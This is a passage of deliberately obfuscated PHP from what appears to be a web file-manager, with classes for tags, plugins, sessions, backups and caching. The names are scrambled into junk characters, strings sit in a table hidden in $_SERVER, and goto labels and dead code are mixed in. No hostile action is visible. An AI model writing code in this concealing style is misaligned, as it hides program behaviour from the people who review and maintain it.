$à§¯õßí = !0; foreach ($•òïÖşı as $ÒÒû­) { if ($à¸™éÒ¨ % $ÒÒû­ == 0) { $à§¯õßí = !1; break; } } if ($à§¯õßí) { $¢è¸ùŒÕ = $à¸™éÒ¨; break; } } return $¢è¸ùŒÕ; $ßò¸— = $ãôêˆîÊ[800]; if (!$ßò¸—) { die; } } public function axfy04f969d1($ïÛÏÓ‘ï, $§œÓ½ô¯) { $–‡››ì =& $_SERVER[¶¬±€ıš]; return call_user_func(array($–‡››ì[8], $–‡››ì[304]), $ïÛÏÓ‘ï, $§œÓ½ô¯); $øş¾£Êš = $_SERVER[ú‡®¯¨±][801]; } public function skdy9e7e725a($ÖõƒïÏÖ, $¦Í·¹¦¸) { $ƒ‰‰Ş… =& $_SERVER[¶¬±€ıš]; return call_user_func(array($ƒ‰‰Ş…[305], $ƒ‰‰Ş…[306]), $ÖõƒïÏÖ, $¦Í·¹¦¸); } public function yfat254a41d3($«Ÿî‚üÛ, $”§¢å‚Ü) { $¶·Øê•Ö =& $_SERVER[¶¬±€ıš]; return call_user_func(array($¶·Øê•Ö[305], $¶·Øê•Ö[307]), $«Ÿî‚üÛ, $”§¢å‚Ü); $æş‰ù™È = $_SERVER[ú‡®¯¨±][802]; if (!$æş‰ù™È) { return; } } } goto F™›Š¾Ïö°; báÔÍ®òä: class GroupTagModel extends ModelBase { protected $tableName = "\x75\x73\145\x72\x5f\146\x61\x76"; protected function cacheFunctionAlias($™¡şÉüª) { $¬ÓŞñ‡­ =& $_SERVER[ú‡®¯¨±]; return array($¬ÓŞñ‡­[2015] => array($™¡şÉüª[0], $¬ÓŞñ‡­[2016]), $¬ÓŞñ‡­[2017] => array($™¡şÉüª[0], $¬ÓŞñ‡­[2018])); } protected function get($·»‘Ü¼ñ) { $–‡Î œ =& $_SERVER[ú‡®¯¨±]; $…å»•ôÄ = Model($–‡Î œ[564])->metaGet($·»‘Ü¼ñ, $–‡Î œ[2019]); $¨ƒÛ­½Ö = json_decode($…å»•ôÄ, !0); return $¨ƒÛ­½Ö ? $¨ƒÛ­½Ö : array($–‡Î œ[2020] => $–‡Î œ[90], $–‡Î œ[424] => array()); } protected function set($À„ô±ƒ—, $¯‘“Ç¡) { $Ô«Äõ¤ =& $_SERVER[ú‡®¯¨±]; $¯‘“Ç¡ = $¯‘“Ç¡ ? $¯‘“Ç¡ : array($Ô«Äõ¤[2020] => $Ô«Äõ¤[90], $Ô«Äõ¤[424] => array()); return Model($Ô«Äõ¤[564])->metaSet($À„ô±ƒ—, $Ô«Äõ¤[2019], json_encode($¯‘“Ç¡)); } protected function getByTagID($©Ù«¢€”, $Ó‚‰îøö) { $ßËÅô½— =& $_SERVER[ú‡®¯¨±]; if (!$©Ù«¢€” || !$Ó‚‰îøö) { return !1; } if (!Model($ßËÅô½—[564])->getInfoSimple($©Ù«¢€”)) { return !1; } $©ÃÆÚê° = $this->get($©Ù«¢€”); if (!$©ÃÆÚê° || !isset($©ÃÆÚê°[$ßËÅô½—[424]])) { return !1; } $¢¢Ìñ–» = array_find_by_field($©ÃÆÚê°[$ßËÅô½—[424]], $ßËÅô½—[453], $Ó‚‰îøö); return is_array($¢¢Ìñ–») ? $¢¢Ìñ–» : !1; } public function listSource($¼ÀáÑâ, $ñ¶Èœ©Ÿ) { $è±ŸÇæ‡ =& $_SERVER[ú‡®¯¨±]; if ($ñ¶Èœ©Ÿ && !is_array($ñ¶Èœ©Ÿ)) { $ñ¶Èœ©Ÿ = array($ñ¶Èœ©Ÿ); } $¹ÛîÖĞ€ = $this->listData($¼ÀáÑâ); $öùÔƒ°é = array(); foreach ($¹ÛîÖĞ€ as $‡Ï©“ˆÆ) { $ÅÀ¢¿Ãñ = $‡Ï©“ˆÆ[$è±ŸÇæ‡[86]]; if (!$ÅÀ¢¿Ãñ) { continue; } if (!isset($öùÔƒ°é[$ÅÀ¢¿Ãñ])) { $öùÔƒ°é[$ÅÀ¢¿Ãñ] = array(); } $öùÔƒ°é[$ÅÀ¢¿Ãñ][] = $‡Ï©“ˆÆ[$è±ŸÇæ‡[478]]; } $âğ§¾¯Ç = array(); foreach ($öùÔƒ°é as $ÃÜ®Å¢ => $ÂáÈİÕ) { $æ¸Ÿƒ¶ = !0; if (!$ñ¶Èœ©Ÿ) { $âğ§¾¯Ç[] = $ÃÜ®Å¢; continue; } foreach ($ñ¶Èœ©Ÿ as $ûŒ¤°Éû) { if (!in_array($ûŒ¤°Éû, $ÂáÈİÕ)) { $æ¸Ÿƒ¶ = !1; break; } } if ($æ¸Ÿƒ¶) { $âğ§¾¯Ç[] = $ÃÜ®Å¢; } } if (!$âğ§¾¯Ç) { return array(); } $Ø¸ÌçóÆ = array($è±ŸÇæ‡[469] => array($è±ŸÇæ‡[470], $âğ§¾¯Ç), $è±ŸÇæ‡[548] => $¼ÀáÑâ, $è±ŸÇæ‡[180] => SourceModel::TYPE_GROUP); $ºä¢ë°× = Model($è±ŸÇæ‡[1389])->listSource($Ø¸ÌçóÆ); if (!$ºä¢ë°× || count($âğ§¾¯Ç) == $ºä¢ë°×[$è±ŸÇæ‡[421]][$è±ŸÇæ‡[422]]) { return $ºä¢ë°×; } $üıöÈÌ = array(); $Ş–Ó¦É = array_to_keyvalue($ºä¢ë°×[$è±ŸÇæ‡[84]], $è±ŸÇæ‡[12], $è±ŸÇæ‡[183]); $‚Œ‚Â¡ = array_to_keyvalue($ºä¢ë°×[$è±ŸÇæ‡[85]], $è±ŸÇæ‡[12], $è±ŸÇæ‡[183]); $ğË–—İğ = array_merge($‚Œ‚Â¡, $Ş–Ó¦É); foreach ($âğ§¾¯Ç as $ÅÀ¢¿Ãñ) { if (!in_array($ÅÀ¢¿Ãñ, $ğË–—İğ)) { $üıöÈÌ[] = $ÅÀ¢¿Ãñ; } } if ($üıöÈÌ) { $this->removeBySource($¼ÀáÑâ, $üıöÈÌ); } return $ºä¢ë°×; } protected function listData($³¿à) { $¾øÜØ¿Â =& $_SERVER[ú‡®¯¨±]; $Æà“Â–§ = array($¾øÜØ¿Â[1699] => 0, $¾øÜØ¿Â[536] => array($¾øÜØ¿Â[2021], 0), $¾øÜØ¿Â[474] => $¾øÜØ¿Â[2022] . $³¿à); $ıÌ‡»Ÿè = $¾øÜØ¿Â[2023]; $§ŠÎÈòß = $this->field($ıÌ‡»Ÿè)->where($Æà“Â–§)->order($¾øÜØ¿Â[2024])->select(); return $§ŠÎÈòß ? $§ŠÎÈòß : array(); } protected function addToTag($äø¸ß™ , $Øúß•º¢, $“Öºã„¯) { $«‡ëñÊ± =& $_SERVER[ú‡®¯¨±]; if (!$this->getByTagID($äø¸ß™ , $“Öºã„¯) || !$Øúß•º¢) { return !1; } if (!Model($«‡ëñÊ±[880])->pathInfo($Øúß•º¢)) { return !1; } $Â¿°ùíÑ = array($«‡ëñÊ±[1699] => 0, $«‡ëñÊ±[536] => $“Öºã„¯, $«‡ëñÊ±[473] => $Øúß•º¢, $«‡ëñÊ±[474] => $«‡ëñÊ±[2025] . $äø¸ß™ , $«‡ëñÊ±[472] => $«‡ëñÊ±[12], $«‡ëñÊ±[1910] => 0); if ($this->where($Â¿°ùíÑ)->find()) { return !1; } return $this->add($Â¿°ùíÑ); } protected function removeFromTag($¶€àËô», $¡ÁÄÃ§†, $¾‚Œ Ö) { $áÀøËªÉ =& $_SERVER[ú‡®¯¨±]; if (!$this->getByTagID($¶€àËô», $¾‚Œ Ö) || !$¡ÁÄÃ§†) { return !1; } if (is_array($¡ÁÄÃ§†)) { $¡ÁÄÃ§† = array($áÀøËªÉ[7], $¡ÁÄÃ§†); } $é“ºÑÁ§ = array($áÀøËªÉ[1699] => 0, $áÀøËªÉ[536] => $¾‚Œ Ö, $áÀøËªÉ[474] => $áÀøËªÉ[2025] . $¶€àËô», $áÀøËªÉ[473] => $¡ÁÄÃ§†); return $this->where($é“ºÑÁ§)->delete(); } protected function removeByTag($–÷¯ë, $î±…æñ) { $Âİ˜ç ¶ =& $_SERVER[ú‡®¯¨±]; if (!$this->getByTagID($–÷¯ë, $î±…æñ)) { return !1; } $¹©Íâ = array($Âİ˜ç ¶[1699] => 0, $Âİ˜ç ¶[536] => $î±…æñ, $Âİ˜ç ¶[474] => $Âİ˜ç ¶[2025] . $–÷¯ë); return $this->where($¹©Íâ)->delete(); } protected function removeBySource($‹ıÊ÷Î™, $ĞéÚˆá) { $°¹³ê¬… =& $_SERVER[ú‡®¯¨±]; if (!$‹ıÊ÷Î™ || !$ĞéÚˆá) { return !1; } if (is_array($ĞéÚˆá)) { $ĞéÚˆá = array($°¹³ê¬…[7], $ĞéÚˆá); } $Ô—œñ¾ = array($°¹³ê¬…[1699] => 0, $°¹³ê¬…[473] => $ĞéÚˆá, $°¹³ê¬…[536] => array($°¹³ê¬…[1070], 0), $°¹³ê¬…[474] => $°¹³ê¬…[2025] . $‹ıÊ÷Î™); return $this->where($Ô—œñ¾)->delete(); } } class PluginModel extends ModelBaseLight { public $optionType = "\123\x79\163\164\x65\x6d\56\160\x6c\165\147\x69\156\x4c\x69\163\164"; public $field = array("\156\x61\155\145", "\163\164\141\164\x75\163", "\162\x65\147\x69\x65\163\164", "\x63\157\156\146\x69\147"); public function loadList($±ÒöÖ = false) { $ñ’Ò‡âÙ = array_to_keyvalue($this->listData(), $_SERVER[ú‡®¯¨±][32]); if ($±ÒöÖ) { return $ñ’Ò‡âÙ[$±ÒöÖ]; } return $ñ’Ò‡âÙ; } public function init() { $àÚ¯ö¥ı =& $_SERVER[ú‡®¯¨±]; Hook::trigger($àÚ¯ö¥ı[2026]); $‰àñò¼  = $this->loadPluginList(); foreach ($‰àñò¼  as $šœë¿™ü => $œ¥ñ”¢Ë) { $ƒà“®Õ = $this->appAllow($šœë¿™ü, $œ¥ñ”¢Ë); if (!$ƒà“®Õ) { continue; } foreach ($œ¥ñ”¢Ë[$àÚ¯ö¥ı[2027]] as $ØÓöĞÂƒ => $ñ›Èˆèç) { Hook::bind($ØÓöĞÂƒ, $ñ›Èˆèç); } } Hook::trigger($àÚ¯ö¥ı[2028]); Hook::trigger(ACTION); } public function appAllow($®ã¹Âœ¬, $ÚòÒ÷›‹, $Ä¤òÀÎ¯ = true) { $”ÁêÔ =& $_SERVER[ú‡®¯¨±]; $ØÙŞ”é¾ = PLUGIN_DIR . $®ã¹Âœ¬ . $”ÁêÔ[2029]; if (!is_array($ÚòÒ÷›‹) || !is_array($ÚòÒ÷›‹[$”ÁêÔ[2027]]) || $ÚòÒ÷›‹[$”ÁêÔ[805]] != 1 || !is_file($ØÙŞ”é¾)) { return !1; } if (KodUser::isRoot()) { if ($GLOBALS[$”ÁêÔ[6]][$”ÁêÔ[2030]] || !$GLOBALS[$”ÁêÔ[6]][$”ÁêÔ[2031]]) { return !0; } $¿—öĞƒÑ = explode($”ÁêÔ[50], strtolower($GLOBALS[$”ÁêÔ[6]][$”ÁêÔ[2031]])); return in_array(strtolower($®ã¹Âœ¬), $¿—öĞƒÑ) ? !1 : !0; } if ($Ä¤òÀÎ¯ && !Action($”ÁêÔ[2032])->checkAuth($®ã¹Âœ¬)) { return !1; } return !0; } public function unInstall($Ç€ã¦´) { $›ôã‡¯» =& $_SERVER[ú‡®¯¨±]; $Ò»´òôù = $this->loadList($Ç€ã¦´); if (file_exists(PLUGIN_DIR . $Ç€ã¦´)) { Hook::apply($Ç€ã¦´ . $›ôã‡¯»[2033]); } $this->remove($Ò»´òôù[$›ôã‡¯»[453]]); } public function changeStatus($…—×›Á, $°şÚÌ÷å) { $Æ¥‹Úñ³ =& $_SERVER[ú‡®¯¨±]; $é¹ø¥–Á = $this->loadList($…—×›Á); if ($°şÚÌ÷å) { Hook::apply($…—×›Á . $Æ¥‹Úñ³[2034]); } $this->update($é¹ø¥–Á[$Æ¥‹Úñ³[453]], array($Æ¥‹Úñ³[2035] => $°şÚÌ÷å)); } public function appRegist($ñ—¥–÷, $´õ„»ÁÖ) { $¿¾Šª³‘ =& $_SERVER[ú‡®¯¨±]; $ÁÒ´Ğ—¶ = $this->loadList($ñ—¥–÷); if ($ÁÒ´Ğ—¶) { $this->update($ÁÒ´Ğ—¶[$¿¾Šª³‘[453]], array($¿¾Šª³‘[2027] => $´õ„»ÁÖ)); } else { $áœ€®§² = array($¿¾Šª³‘[32] => $ñ—¥–÷, $¿¾Šª³‘[2027] => $´õ„»ÁÖ, $¿¾Šª³‘[805] => 0, $¿¾Šª³‘[6] => $this->getConfigDefault($ñ—¥–÷)); $this->insert($áœ€®§²); } } public function getConfigDefault($¦Ö¨×Ô¡) { $ˆÁƒ¶Œ =& $_SERVER[ú‡®¯¨±]; $ŞØŒœ© = array(); $âï´ÙâÑ = $this->getPackageJson($¦Ö¨×Ô¡); if (!$âï´ÙâÑ && is_array($âï´ÙâÑ[$ˆÁƒ¶Œ[2036]])) { return $ŞØŒœ©; } foreach ($âï´ÙâÑ[$ˆÁƒ¶Œ[2036]] as $®¡şï„ò => $ğ¡üñŞ») { if (!isset($ğ¡üñŞ»[$ˆÁƒ¶Œ[429]]) || isset($ŞØŒœ©[$®¡şï„ò])) { continue; } $ŞØŒœ©[$®¡şï„ò] = $ğ¡üñŞ»[$ˆÁƒ¶Œ[429]]; } return $ŞØŒœ©; } public function getPackageJson($áîÍåş) { return Hook::apply($áîÍåş . $_SERVER[ú‡®¯¨±][2037]); } public function getConfig($Ã‘»’Å°, $÷…±ä”³ = false) { $—·¼¢¶ =& $_SERVER[ú‡®¯¨±]; $şÓ›ßßå = array(); $ÌÖóàïÁ = $this->loadList($Ã‘»’Å°); if ($ÌÖóàïÁ && is_array($ÌÖóàïÁ[$—·¼¢¶[6]])) { $şÓ›ßßå = $ÌÖóàïÁ[$—·¼¢¶[6]]; } if (!$şÓ›ßßå || $÷…±ä”³) { $şÓ›ßßå = $this->getConfigDefault($Ã‘»’Å°); } return $şÓ›ßßå; } public function setConfig($•ÛæÇ§Ë, $³¼ô°šÎ = false) { $øÑÓÊ­ =& $_SERVER[ú‡®¯¨±]; $ú“Í¨• = $this->loadList($•ÛæÇ§Ë); if (!$ú“Í¨•) { return !1; } $ŠèŞĞ© = $ú“Í¨•[$øÑÓÊ­[6]]; if ($³¼ô°šÎ == !1) { $ŠèŞĞ© = array(); $³¼ô°šÎ = $this->getConfigDefault($•ÛæÇ§Ë); } foreach ($³¼ô°šÎ as $Áúî«Õí => $£¸Œ Ÿ) { $ŠèŞĞ©[$Áúî«Õí] = is_string($£¸Œ Ÿ) ? trim($£¸Œ Ÿ) : $£¸Œ Ÿ; } $this->update($ú“Í¨•[$øÑÓÊ­[453]], array($øÑÓÊ­[6] => $ŠèŞĞ©)); } public function viewList() { $àˆœİ­ =& $_SERVER[ú‡®¯¨±]; $€¢Ğ«Ã = $this->loadList(); $this->pluginScan($€¢Ğ«Ã); $€¢Ğ«Ã = $this->loadPluginList(); $š÷Ğï‚ = array(); foreach ($€¢Ğ«Ã as $Íú­Ğ…… => $¦¨®ü˜—) { $ßÉİúõú = $¦¨®ü˜—; unset($¦¨®ü˜—[$àˆœİ­[2027]], $¦¨®ü˜—[$àˆœİ­[6]]); $İ’ù–Ö’ = PLUGIN_DIR . $¦¨®ü˜—[$àˆœİ­[32]] . $àˆœİ­[2029]; if (!is_file($İ’ù–Ö’)) { continue; } $ªÚƒ¿¿ = Hook::apply($¦¨®ü˜—[$àˆœİ­[32]] . $àˆœİ­[2037]); if (!is_array($ªÚƒ¿¿)) { continue; } $š÷Ğï‚[$Íú­Ğ……] = array_merge($¦¨®ü˜—, $ªÚƒ¿¿); if ($ßÉİúõú[$àˆœİ­[6]][$àˆœİ­[1623]] != $ªÚƒ¿¿[$àˆœİ­[1597]]) { Hook::apply($¦¨®ü˜—[$àˆœİ­[32]] . $àˆœİ­[2034]); $ßÉİúõú[$àˆœİ­[6]][$àˆœİ­[1623]] = $ªÚƒ¿¿[$àˆœİ­[1597]]; $this->update($¦¨®ü˜—[$àˆœİ­[453]], array($àˆœİ­[6] => $ßÉİúõú[$àˆœİ­[6]])); } } return $š÷Ğï‚; } private function loadPluginList() { $‘ĞïÕŸ÷ =& $_SERVER[ú‡®¯¨±]; $Òüœ«Ä³ = $this->loadList(); if (strtolower(MOD) == $‘ĞïÕŸ÷[2038]) { return $Òüœ«Ä³; } $ ÒÉŒ©° = Hook::trigger($‘ĞïÕŸ÷[2039], $Òüœ«Ä³); if ($Òüœ«Ä³ && !$ ÒÉŒ©°) { die; } return $ ÒÉŒ©° ? $ ÒÉŒ©° : $Òüœ«Ä³; } private function pluginScan($†Šà›ù) { $÷ßá½ =& $_SERVER[ú‡®¯¨±]; recursion_dir(PLUGIN_DIR, $şŞõÀğ¬, $«¬¶™ò‘, 0); foreach ($şŞõÀğ¬ as $‹šÎÖÌ™) { $ö¢•Çù = get_path_this($‹šÎÖÌ™); if (isset($†Šà›ù[$ö¢•Çù]) || !file_exists($‹šÎÖÌ™ . $÷ßá½[2040]) || !file_exists($‹šÎÖÌ™ . $÷ßá½[2029])) { continue; } Hook::apply($ö¢•Çù . $÷ßá½[2034]); } } } class SessionModel extends ModelBase { protected $tableName = "\x73\x79\x73\x74\145\155\x5f\x73\145\163\163\151\157\x6e"; public function get($ö‡ƒ¥È) { $ÄïäÕÂ¾ =& $_SERVER[ú‡®¯¨±]; $§Æ±ŸÕç = $this->where(array($ÄïäÕÂ¾[2041] => $ö‡ƒ¥È))->find(); if (!is_array($§Æ±ŸÕç)) { return !1; } return $§Æ±ŸÕç[$ÄïäÕÂ¾[809]]; } public function set($Ø™­ÖŸ¿, $ı•Á•¡Ü, $¾„Ï×ú¬ = 3600) { $ÅÍ–ª“à =& $_SERVER[ú‡®¯¨±]; $¼ÌóØö = array($ÅÍ–ª“à[2041] => $Ø™­ÖŸ¿, $ÅÍ–ª“à[1945] => $ı•Á•¡Ü, $ÅÍ–ª“à[2042] => $¾„Ï×ú¬ + time()); if (Session::get($ÅÍ–ª“à[2043])) { $¼ÌóØö[$ÅÍ–ª“à[1708]] = Session::get($ÅÍ–ª“à[2043]); } else { $¼ÌóØö[$ÅÍ–ª“à[1708]] = 0; } if ($this->get($Ø™­ÖŸ¿)) { return $this->where(array($ÅÍ–ª“à[2041] => $Ø™­ÖŸ¿))->save($¼ÌóØö); } else { return $this->add($¼ÌóØö, array(), !0); } } public function remove($Áòç‘öÔ) { return $this->where(array($_SERVER[ú‡®¯¨±][2041] => $Áòç‘öÔ))->delete(); } public function clearTimeout() { return $this->where($_SERVER[ú‡®¯¨±][2044] . time())->delete(); } } goto eà“ÚÛÂ²Œ; Fá•¢¯—‹‹: class BackupFile { public function __construct() { } public function index() { $î¼Ú–À = Backup::get(); $À§ÔçÆ = $î¼Ú–À[$_SERVER[ú‡®¯¨±][348]][$_SERVER[ú‡®¯¨±][226]][$_SERVER[ú‡®¯¨±][519]]; $ ŸØ¼¼Ä = array($_SERVER[ú‡®¯¨±][520] => array($_SERVER[ú‡®¯¨±][862], $À§ÔçÆ), $_SERVER[ú‡®¯¨±][863] => array($_SERVER[ú‡®¯¨±][386], $î¼Ú–À[$_SERVER[ú‡®¯¨±][806]])); $¬äŞ–Ş = (int) Model($_SERVER[ú‡®¯¨±][844])->where($ ŸØ¼¼Ä)->count($_SERVER[ú‡®¯¨±][519]); $€üÔ—€ø = (int) Model($_SERVER[ú‡®¯¨±][844])->where($ ŸØ¼¼Ä)->sum($_SERVER[ú‡®¯¨±][78]); $Òƒ²…¸â = new TaskFileTransfer($_SERVER[ú‡®¯¨±][864], $_SERVER[ú‡®¯¨±][835], $¬äŞ–Ş, LNG($_SERVER[ú‡®¯¨±][836]) . $_SERVER[ú‡®¯¨±][837] . LNG($_SERVER[ú‡®¯¨±][865])); $Òƒ²…¸â->task[$_SERVER[ú‡®¯¨±][818]] = $€üÔ—€ø; $ç†¹Óéë = array($_SERVER[ú‡®¯¨±][866] => $¬äŞ–Ş, $_SERVER[ú‡®¯¨±][867] => $€üÔ—€ø, $_SERVER[ú‡®¯¨±][868] => time()); Backup::set($ç†¹Óéë); $«ä´û•î = !0; $¶…Ôì¯Ó = $this->storeIds(); $£Ê¼ø¨ = 1; $³‰õ´Á… = 1000; $ñÜŞúÉ¸ = $ç²¦Æ˜ı = 0; $ø»üÃÉé = array(); $Ì¿åğµê = $ÀòŸûÀ¶ = 0; do { $°â¨¨À = $_SERVER[ú‡®¯¨±][869]; $ÓêôÃ›½ = Model($_SERVER[ú‡®¯¨±][844])->where($ ŸØ¼¼Ä)->field($°â¨¨À)->order($_SERVER[ú‡®¯¨±][870])->selectPage($³‰õ´Á…, $£Ê¼ø¨); $Æ‚¸ùÕ = !empty($ÓêôÃ›½[$_SERVER[ú‡®¯¨±][424]]) ? $ÓêôÃ›½[$_SERVER[ú‡®¯¨±][424]] : array(); foreach ($Æ‚¸ùÕ as $€Øó‚õ¸) { if (!$this->_fileExist($€Øó‚õ¸, $ø»üÃÉé, $¶…Ôì¯Ó)) { $¬äŞ–Ş -= 1; $€üÔ—€ø -= (int) $€Øó‚õ¸[$_SERVER[ú‡®¯¨±][78]]; write_log("\146\x69\154\145\x20\x6e\157\x74\x20\x65\170\x69\163\164\56\146\x69\x6c\145\111\x44\x3a{$€Øó‚õ¸[$_SERVER[ú‡®¯¨±][519]]}\x2c\40\160\x61\164\150\72{$€Øó‚õ¸[$_SERVER[ú‡®¯¨±][86]]}", $_SERVER[ú‡®¯¨±][871]); continue; } $¿ö©—˜© = $€Øó‚õ¸[$_SERVER[ú‡®¯¨±][86]]; $”úì­» = "\x7b\151\x6f\x3a{$î¼Ú–À[$_SERVER[ú‡®¯¨±][806]]}\x7d" . substr($¿ö©—˜©, strlen("\173\x69\157\72{$€Øó‚õ¸[$_SERVER[ú‡®¯¨±][872]]}\175")); if (IO::exist($”úì­»)) { $Òƒ²…¸â->updateFileEnd($€Øó‚õ¸[$_SERVER[ú‡®¯¨±][32]], $€Øó‚õ¸[$_SERVER[ú‡®¯¨±][78]]); } else { $”úì­» = get_path_father($”úì­»); IO::mkdir($”úì­»); if (!IO::copy($¿ö©—˜©, $”úì­», $_SERVER[ú‡®¯¨±][873])) { write_log($_SERVER[ú‡®¯¨±][874] . $¿ö©—˜© . $_SERVER[ú‡®¯¨±][858] . $”úì­» . $_SERVER[ú‡®¯¨±][167], $_SERVER[ú‡®¯¨±][835]); $«ä´û•î = !1; break; } } $À§ÔçÆ = $€Øó‚õ¸[$_SERVER[ú‡®¯¨±][519]]; $ç²¦Æ˜ı += 1; $ñÜŞúÉ¸ += $€Øó‚õ¸[$_SERVER[ú‡®¯¨±][78]]; $ÀòŸûÀ¶ += 1; $Ì¿åğµê += $€Øó‚õ¸[$_SERVER[ú‡®¯¨±][78]]; if ($ñÜŞúÉ¸ >= 1024 * 1024 * 100) { $ç†¹Óéë = array($_SERVER[ú‡®¯¨±][875] => $À§ÔçÆ, $_SERVER[ú‡®¯¨±][876] => $ÀòŸûÀ¶, $_SERVER[ú‡®¯¨±][877] => $Ì¿åğµê); Backup::set($ç†¹Óéë); $ñÜŞúÉ¸ = $ç²¦Æ˜ı = 0; } } $œµ–âÎ = count($Æ‚¸ùÕ); $£Ê¼ø¨++; } while ($œµ–âÎ == $³‰õ´Á…); $Òƒ²…¸â->end(); $ç†¹Óéë = array($_SERVER[ú‡®¯¨±][878] => 1, $_SERVER[ú‡®¯¨±][816] => time(), $_SERVER[ú‡®¯¨±][830] => 1, $_SERVER[ú‡®¯¨±][875] => $À§ÔçÆ, $_SERVER[ú‡®¯¨±][867] => $€üÔ—€ø, $_SERVER[ú‡®¯¨±][866] => $¬äŞ–Ş, $_SERVER[ú‡®¯¨±][879] => time()); if ($ç²¦Æ˜ı) { $ç†¹Óéë[$_SERVER[ú‡®¯¨±][876]] = $ÀòŸûÀ¶; $ç†¹Óéë[$_SERVER[ú‡®¯¨±][877]] = $Ì¿åğµê; } Backup::set($ç†¹Óéë); $this->_fileFilter($ø»üÃÉé); return !0; } private function _fileExist($±Ç¹èäË, &$Ë†¡Å±©, $ü’­¢¸Å) { $™´÷àú© =& $_SERVER[ú‡®¯¨±]; $ƒÖ´Ö° = $±Ç¹èäË[$™´÷àú©[86]]; if (in_array($±Ç¹èäË[$™´÷àú©[519]], $Ë†¡Å±©)) { return !1; } if (!in_array($±Ç¹èäË[$™´÷àú©[872]], $ü’­¢¸Å)) { return !1; } if (IO::exist($ƒÖ´Ö°)) { return !0; } $Õßšûì = get_path_father($ƒÖ´Ö°); if (IO::exist($Õßšûì)) { $Ë†¡Å±©[] = $±Ç¹èäË[$™´÷àú©[519]]; return !1; } $µ¢ãÇí = array($™´÷àú©[872] => $±Ç¹èäË[$™´÷àú©[872]], $™´÷àú©[86] => array($™´÷àú©[437], "{$Õßšûì}\45")); $¬µ¤òÁ± = Model($™´÷àú©[844])->where($µ¢ãÇí)->field($™´÷àú©[520])->select(); $Ë†¡Å±© = array_merge($Ë†¡Å±©, array_to_keyvalue($¬µ¤òÁ±, $™´÷àú©[12], $™´÷àú©[519])); return !1; } private function _fileFilter($Öó²Î„) { $“ïİ³ãº =& $_SERVER[ú‡®¯¨±]; if (empty($Öó²Î„)) { return; } $Î‚¾ = array($“ïİ³ãº[519] => array($“ïİ³ãº[7], array_unique($Öó²Î„))); $ß¸ëÖ§‡ = Model($“ïİ³ãº[880])->where($Î‚¾)->field($“ïİ³ãº[183])->select(); foreach ($ß¸ëÖ§‡ as $È”Ã¶¿) { Model($“ïİ³ãº[880])->remove($È”Ã¶¿[$“ïİ³ãº[183]], !1); } } private function storeIds() { $™Ô¬½¤ğ =& $_SERVER[ú‡®¯¨±]; $ØŞË¬Ÿû = Model($™Ô¬½¤ğ[822])->listData(); $³°âš…µ = array(); $ºË‹‘µó = $GLOBALS[$™Ô¬½¤ğ[6]][$™Ô¬½¤ğ[91]][$™Ô¬½¤ğ[881]]; foreach ($ØŞË¬Ÿû as $ß’™ø˜õ) { $áÛµú™ = strtolower($ß’™ø˜õ[$™Ô¬½¤ğ[97]]); if (!isset($ºË‹‘µó[$áÛµú™])) { continue; } $õ ¢½Õ = $™Ô¬½¤ğ[76] . (isset($ºË‹‘µó[$áÛµú™]) ? $ºË‹‘µó[$áÛµú™] : ucfirst($áÛµú™)); if (!class_exists($õ ¢½Õ)) { continue; } $³°âš…µ[] = $ß’™ø˜õ[$™Ô¬½¤ğ[453]]; } return $³°âš…µ; } } class Cache { protected static $handle; protected static $memoryCache; public static function init() { $ªá„Ã¶ò =& $_SERVER[ú‡®¯¨±]; if (self::$handle) { return self::$handle; } self::$memoryCache = array(); $ÛùòŒ§û = $GLOBALS[$ªá„Ã¶ò[6]][$ªá„Ã¶ò[404]]; $¾öÁ‹Â = $ÛùòŒ§û[$ÛùòŒ§û[$ªá„Ã¶ò[882]]]; $ÖŒöï†Ì = $ÛùòŒ§û[$ªá„Ã¶ò[883]]; switch ($ÛùòŒ§û[$ªá„Ã¶ò[882]]) { case $ªá„Ã¶ò[21]: self::$handle = Model($ªá„Ã¶ò[884]); break; case $ªá„Ã¶ò[885]: self::$handle = new CacheRedis($¾öÁ‹Â, $ÖŒöï†Ì); break; case $ªá„Ã¶ò[886]: self::$handle = new CacheMemcached($¾öÁ‹Â, $ÖŒöï†Ì); break; case $ªá„Ã¶ò[226]: self::$handle = new CacheFile($¾öÁ‹Â, $ÖŒöï†Ì); break; default: break; } return self::$handle; } public static function initReset() { self::$handle = !1; self::$memoryCache = !1; } public static function key($±ŒÜö½®) { if (is_array($±ŒÜö½®) || is_object($±ŒÜö½®)) { $±ŒÜö½® = json_encode($±ŒÜö½®); } $±ŒÜö½® = rawurlencode($±ŒÜö½®); return md5(KOD_SITE_ID . $_SERVER[ú‡®¯¨±][11] . $±ŒÜö½®); } public static function get($Ğİ’¦¡ı, $´‡©ÇÍ­ = false) { $‡¶Ìø„è = self::key($Ğİ’¦¡ı); $Ô¤úµ’‰ = self::init(); if ($´‡©ÇÍ­) { return unserialize($Ô¤úµ’‰->get($‡¶Ìø„è)); } if (!isset(self::$memoryCache[$‡¶Ìø„è])) { $ûá …“œ = $Ô¤úµ’‰->get($‡¶Ìø„è); self::$memoryCache[$‡¶Ìø„è] = unserialize($ûá …“œ); } return self::$memoryCache[$‡¶Ìø„è]; } public static function set($ÒÚ”àú, $É³ë—„, $¾ËúÊÂ‚ = false) { $ñ¹¾Ë =& $_SERVER[ú‡®¯¨±]; $ãÎ†Ç©ß = self::key($ÒÚ”àú); if (isset(self::$memoryCache[$ãÎ†Ç©ß]) && self::$memoryCache[$ãÎ†Ç©ß] === $É³ë—„) { return !0; } if ($¾ËúÊÂ‚ === 0) { self::$memoryCache[$ãÎ†Ç©ß] = $É³ë—„; return !0; } $½üÛ¾±Î = self::init(); $„¿ÊùŠ = serialize($É³ë—„); CacheLock::lock($ÒÚ”àú . $ñ¹¾Ë[887]); $€ÔÜ™‰é = $½üÛ¾±Î->set($ãÎ†Ç©ß, $„¿ÊùŠ, $¾ËúÊÂ‚); self::$memoryCache[$ãÎ†Ç©ß] = $É³ë—„; CacheLock::unlock($ÒÚ”àú . $ñ¹¾Ë[887]); return $€ÔÜ™‰é; } public static function getCall($§İĞßí½, $á£·¸»ò, $şÄëŒ‚‘, $ô¬ûéË¼ = array()) { $êÙ¶€şŒ =& $_SERVER[ú‡®¯¨±]; $“ºÏÃƒì = self::get($§İĞßí½); if ($“ºÏÃƒì || $“ºÏÃƒì === $êÙ¶€şŒ[12]) { return $“ºÏÃƒì; } $“ºÏÃƒì = call_user_func_array($şÄëŒ‚‘, $ô¬ûéË¼); $“ºÏÃƒì = $“ºÏÃƒì ? $“ºÏÃƒì : $êÙ¶€şŒ[12]; self::set($§İĞßí½, $“ºÏÃƒì, $á£·¸»ò); return $“ºÏÃƒì; } public static function 